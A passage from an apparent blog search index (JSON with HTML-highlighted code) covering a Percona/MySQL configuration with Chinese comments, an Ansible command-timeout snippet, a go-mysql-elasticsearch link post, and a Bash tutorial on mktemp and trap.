style=\"color:#e6db74\"\u003e161011\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 每次次事务 binlog 刷新到磁盘\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# refs http://liyangliang.me/posts/2014/03/innodb_flush_log_at_trx_commit-and-sync_binlog/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003esync_binlog\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e100\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# binlog 格式(refs https://zhuanlan.zhihu.com/p/33504555)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ebinlog_format\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003erow\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# binlog 自动清理时间\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eexpire_logs_days\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 开启 relay-log，一般作为 slave 时开启\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003erelay_log\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003emysql-replay\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 主从复制时跳过 test 库\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ereplicate_ignore_db\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003etest\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 每个 session binlog 缓存\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ebinlog_cache_size\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e4M\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# binlog 滚动大小\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003emax_binlog_size\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e1024M\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# GTID 相关(refs https://keithlan.github.io/2016/06/23/gtid/)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#gtid_mode=1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#enforce_gtid_consistency=1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e########### InnoDB ###########\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 永久表默认存储引擎\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003edefault_storage_engine\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eInnoDB\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 系统表空间数据文件大小(初始化为 1G，并且自动增长)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003einnodb_data_file_path\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eibdata1:1G:autoextend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# InnoDB 缓存池大小\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# innodb_buffer_pool_size 必须等于 innodb_buffer_pool_chunk_size*innodb_buffer_pool_instances，或者是其整数倍\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# refs https://dev.mysql.com/doc/refman/5.7/en/innodb-buffer-pool-resize.html\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# refs https://zhuanlan.zhihu.com/p/60089484\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003einnodb_buffer_pool_size\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e7680M\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003einnodb_buffer_pool_instances\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003einnodb_buffer_pool_chunk_size\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e128M\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# InnoDB 强制恢复(refs https://www.askmaclean.com/archives/mysql-innodb-innodb_force_recovery.html)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003einnodb_force_recovery\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# InnoDB buffer 预热(refs http://www.dbhelp.net/2017/01/12/mysql-innodb-buffer-pool-warmup.html)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003einnodb_buffer_pool_dump_at_shutdown\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003einnodb_buffer_pool_load_at_startup\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# InnoDB 日志组中的日志文件数\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003einnodb_log_files_in_group\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# InnoDB redo 日志大小\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# refs https://www.percona.com/blog/2017/10/18/chose-mysql-innodb_log_file_size/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003einnodb_log_file_size\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e256MB\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 缓存还未提交的事务的缓冲区大小\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003einnodb_log_buffer_size\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e16M\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# InnoDB 在事务提交后的日志写入频率\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# refs http://liyangliang.me/posts/2014/03/innodb_flush_log_at_trx_commit-and-sync_binlog/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003einnodb_flush_log_at_trx_commit\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# InnoDB DML 操作行级锁等待时间\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 超时返回 ERROR 1205 (HY000): Lock wait timeout exceeded; try restarting transaction\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# refs https://ningyu1.github.io/site/post/75-mysql-lock-wait-timeout-exceeded/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003einnodb_lock_wait_timeout\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e30\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# InnoDB 行级锁超时是否回滚整个事务，默认为 OFF 仅回滚上一条语句\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 此时应用程序可以接受到错误后选择是否继续提交事务(并没有违反 ACID 原子性)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# refs https://www.cnblogs.com/hustcat/archive/2012/11/18/2775487.html\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#innodb_rollback_on_timeout=ON\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# InnoDB 数据写入磁盘的方式，具体见博客文章\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# refs https://www.cnblogs.com/gomysql/p/3595806.html\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003einnodb_flush_method\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eO_DIRECT\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# InnoDB 缓冲池脏页刷新百分比\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# refs https://dbarobin.com/2015/08/29/mysql-optimization-under-ssd\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003einnodb_max_dirty_pages_pct\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e50\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# InnoDB 每秒执行的写IO量\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# refs https://www.centos.bz/2016/11/mysql-performance-tuning-15-config-item/#10.INNODB_IO_CAPACITY,%20INNODB_IO_CAPACITY_MAX\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003einnodb_io_capacity\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e500\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003einnodb_io_capacity_max\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e1000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 请求并发 InnoDB 线程数\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# refs https://www.cnblogs.com/xinysu/p/6439715.html#_lab2_1_0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003einnodb_thread_concurrency\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e60\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 再使用多个 InnoDB 表空间时，允许打开的最大 \u0026#34;.ibd\u0026#34; 文件个数，不设置默认 300，\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 并且取与 table_open_cache 相比较大的一个，此选项独立于 open_files_limit\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# refs https://dev.mysql.com/doc/refman/5.7/en/innodb-parameters.html#sysvar_innodb_open_files\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003einnodb_open_files\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e65535\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 每个 InnoDB 表都存储在独立的表空间(.ibd)中\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003einnodb_file_per_table\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 事务级别(可重复读，会出幻读)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003etransaction_isolation\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eREPEATABLE-READ\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 是否在搜索和索引扫描中使用间隙锁(gap locking)，不建议使用未来将删除\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003einnodb_locks_unsafe_for_binlog\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# InnoDB 后台清理线程数，更大的值有助于 DML 执行性能，\u0026gt;= 5.7.8 默认为 4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003einnodb_purge_threads\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["MySQL","Percona"],"title":"Percona config"},{"categories":["MySQL","Elasticsearch","go-mysql-elasticsearch"],"contents":" go-mysql-elasticsearch Page: / Previous Next ","date":"January 20, 2020","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20200120-go-mysql-elasticsearch/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/go-mysql-org/go-mysql-elasticsearch\" target=\"_blank\" rel=\"noopener\"\u003ego-mysql-elasticsearch\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\n\n\n\n\u003cdiv \n  class=\"pdf-viewer\" \n  data-url=\"./go-mysql-elasticsearch-benchmarking.pdf\" \n  data-hide-paginator=\"false\" \n  data-hide-loader=\"false\"\n  data-page-num=\"1\"\n\u003e\n  \u003cdiv class=\"paginator\"\u003e\n    \u003cdiv class=\"page-number-indicator\"\u003e\n      \u003cspan\u003ePage: \u003cspan class=\"page-num\"\u003e\u003c/span\u003e / \u003cspan class=\"page-count\"\u003e\u003c/span\u003e\u003c/span\u003e\n    \u003c/div\u003e\n    \u003cdiv class=\"next-prev-btn\"\u003e\n      \u003cbutton class=\"prev btn btn-sm btn-info\"\u003ePrevious\u003c/button\u003e\n      \u003cbutton class=\"next btn btn-sm btn-info\"\u003eNext\u003c/button\u003e\n    \u003c/div\u003e\n  \u003c/div\u003e\n\n  \u003cdiv class=\"embed-pdf-container\"\u003e\n      \u003cdiv class=\"loading-wrapper\"\u003e\n        \u003cdiv class=\"loading\"\u003e\u003c/div\u003e\n      \u003c/div\u003e\n      \u003ccanvas class=\"pdf-canvas\"\u003e\u003c/canvas\u003e\n  \u003c/div\u003e\n\u003c/div\u003e","tags":["MySQL","Elasticsearch","go-mysql-elasticsearch"],"title":"go-mysql-elasticsearch-benchmarking"},{"categories":["URL","Ansible"],"contents":" Cannot set command timeout per task with network_cli Ansible 的委托 并发和任务超时 - name: run command ios_command: commands: - show version vars: ansible_command_timeout: 40 ","date":"January 14, 2020","hero":"/images/hero/ansible.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20200114-42200/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/ansible/ansible/issues/42200\" target=\"_blank\" rel=\"noopener\"\u003eCannot set command timeout per task with network_cli\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.cnblogs.com/v394435982/p/5180933.html\" target=\"_blank\" rel=\"noopener\"\u003eAnsible 的委托 并发和任务超时\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e- \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003erun command\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003eios_command\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003ecommands\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eshow version\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003evars\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eansible_command_timeout\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e40\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Ansible"],"title":"Cannot set command timeout per task with network_cli"},{"categories":["URL","SHELL"],"contents":" Bash 脚本如何创建临时文件：mktemp 命令和 trap 命令教程 mktemp 命令 生成的临时文件名是随机的，而且权限是只有用户本人可读写 为了确保临时文件创建成功，mktemp 命令后面最好使用 OR 运算符（||），指定创建失败时退出脚本 为了保证脚本退出时临时文件被删除，可以使用trap命令指定退出时的清除操作 #!/bin/bash trap \u0026#39;rm -f \u0026#34;$TMPFILE\u0026#34;\u0026#39; EXIT TMPFILE=$(mktemp) || exit 1 echo \u0026#34;Our temp file is $TMPFILE\u0026#34; mktemp 命令的参数 -d 参数可以创建一个临时目录 -p 参数可以指定临时文件所在的目录。默认是使用 $TMPDIR 环境变量指定的目录，如果这个变量没设置，那么使用 /tmp 目录。 -t 参数可以指定临时文件的文件名模板，模板的末尾必须至少包含三个连续的 X 字符，表示随机字符，建议至少使用六个 X。默认的文件名模板是 tmp.后接十个随机字符 trap 命令的用法 trap 命令用来在 Bash 脚本中响应系统信号。\n最常见的系统信号就是 SIGINT（中断），即按 Ctrl + C 所产生的信号。trap 命令的-l 参数，可以列出所有的系统信号。\n$ trap -l 1) SIGHUP 2) SIGINT 3) SIGQUIT 4) SIGILL 5) SIGTRAP 6) SIGABRT ... ... trap 的命令格式如下。\n$ trap [动作] [信号] 动作是一个 Bash 命令\n信号:\nHUP：编号 1，脚本与所在的终端脱离联系。 INT：编号 2，用户按下 Ctrl + C，意图让脚本中止运行。 QUIT：编号 3，用户按下 Ctrl + 斜杠，意图退出脚本。 KILL：编号 9，该信号用于杀死进程。 TERM：编号 15，这是 kill 命令发出的默认信号。 EXIT：编号 0，这不是系统信号，而是 Bash 脚本特有的信号，不管什么情况，只要退出脚本就会产生。 注意，trap 命令必须放在脚本的开头。否则，它上方的任何命令导致脚本退出，都不会被它捕获。\n","date":"December 30, 2019","hero":"/images/hero/shell.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2019/20191230-mktemp/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"http://www.ruanyifeng.com/blog/2019/12/mktemp.html\" target=\"_blank\" rel=\"noopener\"\u003eBash 脚本如何创建临时文件：mktemp 命令和 trap 命令教程\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"mktemp-命令\"\u003e\u003ccode\u003emktemp\u003c/code\u003e 命令\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e生成的临时文件名是随机的，而且权限是只有用户本人可读写\u003c/li\u003e\n\u003cli\u003e为了确保临时文件创建成功，\u003ccode\u003emktemp\u003c/code\u003e 命令后面最好使用 OR 运算符（\u003ccode\u003e||\u003c/code\u003e），指定创建失败时退出脚本\u003c/li\u003e\n\u003cli\u003e为了保证脚本退出时临时文件被删除，可以使用\u003ccode\u003etrap\u003c/code\u003e命令指定退出时的清除操作\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etrap \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;rm -f \u0026#34;$TMPFILE\u0026#34;\u0026#39;\u003c/span\u003e EXIT\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eTMPFILE\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003emktemp\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e exit \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho 